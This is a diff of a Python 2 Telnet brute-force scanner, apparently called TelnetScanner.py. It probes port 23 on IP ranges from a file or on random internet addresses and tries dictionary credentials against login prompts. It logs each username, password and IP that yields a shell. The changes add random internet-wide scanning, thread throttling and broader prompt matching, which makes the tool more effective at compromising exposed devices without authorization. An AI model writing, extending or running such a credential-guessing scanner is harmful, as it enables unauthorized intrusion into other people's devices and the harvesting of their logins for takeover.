@@ -1,14 +1,18 @@
 r"""
     From @Locidol with love <3
 """
-#!/usr/bin/python
 
 import socket
 from threading import Thread
 import sys
+import threading
 from netaddr import IPNetwork
 import logging
 import os
+import argparse
+import struct
+import random
+import time
 
 
 logging.basicConfig(filename='data.log', level=logging.DEBUG)
@@ -179,7 +183,7 @@ def is_alive(ip):
 
 def is_open_port_23(ip):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(1.5)
+    sock.settimeout(2)
     try:
         result = sock.connect_ex((ip, 23))
         sock.close()
@@ -207,7 +211,11 @@ def commandControl(sock, data):
 
 
 def prompt_IAC(data):
+
     if data and data[0] == IAC:
+        for c in data:
+            if ord(c) > 50 and ord(c) < 128:
+                return False
         return True
     return False
 
@@ -229,6 +237,8 @@ def prompt_login(data):
 def prompt_password(data):
     if "word:" in data:
         return True
+    if "word>" in data:
+        return True
     return False
 
 
@@ -239,6 +249,10 @@ def prompt_end_password(data):
 
 
 def prompt_shell(data):
+    if data and "assword>" in data:
+        return False
+    if data and "ame>" in data:
+        return False
     if data and data[-1:] == ">":
         return True
     if data and data[-1:] == "#":
@@ -259,7 +273,10 @@ def prompt_shell(data):
 
 
 def optimus(ip):
-
+    if not is_open_port_23(ip):
+        sys.exit(1)
+    logging.debug("O: " + ip)
+    print "try ", ip
     for key, values in dic.items():
         for value in values:
             try:
@@ -287,32 +304,65 @@ def optimus(ip):
                             continue
                         elif prompt_shell(data):
                             logging.info(key + ":" + value + "@" + ip)
-                            sys.exit()
+                            sys.exit(1)
                         else:
                             break
-            except:
-                pass
+            except Exception, e:
+                sys.exit(1)
 
 
-threads = []
+def scan_random_ip(maxThreadNum):
+    while True:
+        ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
+        while threading.activeCount() > maxThreadNum:
+            time.sleep(1)
+        p = Thread(target=optimus, args=[ip])
+        p.daemon = True
+        p.start()
 
-with open(sys.argv[1]) as f:
-    lines = f.readlines()
-    for line in lines:
-        net = IPNetwork(line.strip())
-        for ip in net:
-            ip = str(ip)
-            # if not is_alive(ip):
-            #     continue
-            # logging.debug("*")
 
-            if not is_open_port_23(ip):
-                continue
-            logging.debug("O: " + ip)
+def scan_with_iprange(listip, maxThreadNum):
+    threads = []
 
-            p = Thread(target=optimus, args=[ip])
-            p.daemon = True
-            threads.append(p)
-            p.start()
-for i in threads:
-    i.join()
+    with open(listip) as f:
+        lines = f.readlines()
+        for line in lines:
+            net = IPNetwork(line.strip())
+            for ip in net:
+                ip = str(ip)
+                # if not is_alive(ip):
+                #     continue
+                # logging.debug("*")
+                while threading.activeCount() > maxThreadNum:
+                    time.sleep(1)
+                p = Thread(target=optimus, args=[ip])
+                p.daemon = True
+                threads.append(p)
+                p.start()
+    for i in threads:
+        i.join()
+
+
+if __name__ == "__main__":
+
+    parser = argparse.ArgumentParser(description = "",
+                                                        usage = "\n\npython TelnetScanner.py -t 200\npython TelnetScanner.py -f listip.txt -t 200",)
+    sgroup = parser.add_argument_group("TelnetScanner", "Options for TelnetScanner")
+    sgroup.add_argument("-t", dest="thread", required=False, type=int, help="number of threads")
+    sgroup.add_argument("-f", dest="file", required=False, type=str, help="list ip")
+    options = parser.parse_args()
+
+    if not options.thread:
+        parser.print_help()
+        sys.exit(1)
+
+    if options.thread < 3:
+        options.thread = 3
+
+    if options.file:
+        scan_with_iprange(options.file, options.thread)
+        sys.exit(1)
+
+    if not options.file:
+        scan_random_ip(options.thread)
+        sys.exit(1)
